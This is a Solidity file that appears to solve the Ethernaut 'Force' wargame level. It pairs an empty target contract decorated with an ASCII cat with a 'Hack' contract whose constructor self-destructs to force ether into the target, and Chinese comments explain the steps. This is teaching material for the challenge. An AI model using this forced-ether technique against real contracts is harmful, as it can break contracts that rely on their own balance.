// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

// 可以 Etherscan 查询合约余额， 或用 getBalance("地址") 查询余额
contract Hack {
    // 构造函数 payable, 所以可以发送 value 给 Hack 合约
    // 销毁 Hack 合约，并将余额发给 _target 地址
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
